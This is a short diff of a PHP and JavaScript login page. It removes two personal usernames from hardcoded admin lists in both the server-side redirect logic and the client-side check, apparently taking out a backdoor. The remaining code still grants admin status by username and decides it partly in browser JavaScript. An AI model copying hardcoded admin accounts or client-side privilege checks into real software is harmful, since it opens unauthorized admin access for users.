@@ -30,7 +30,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $authResult = authenticateUserCredentials($uName, $uPass);
         if (!empty($authResult['success']) || (!empty($authResult['status']) && $authResult['status'] === 'success')) {
             $u = strtolower($authResult['username'] ?? '');
-            $isAdm = !empty($authResult['isAdmin']) || in_array($u, ['admin', 'superadmin', 'abas6245', 'abazceboi']);
+            $isAdm = !empty($authResult['isAdmin']) || in_array($u, ['admin', 'superadmin']);
             header("Location: " . ($isAdm ? "secure_hq_panel.php" : "dashboard.php"));
             exit;
         } else {
@@ -723,7 +723,7 @@ if (!empty($_GET['error'])) {
                     localStorage.setItem('ix_activated_' + u, '1');
                     localStorage.setItem('ix_is_activated', '1');
                 }
-                var isAdmin = Boolean(data.isAdmin || u === 'admin' || u === 'superadmin' || u === 'abas6245' || u === 'abazceboi');
+                var isAdmin = Boolean(data.isAdmin || u === 'admin' || u === 'superadmin');
                 var targetUrl = isAdmin ? 'secure_hq_panel.php' : 'dashboard.php';
 
                 setTimeout(function() {
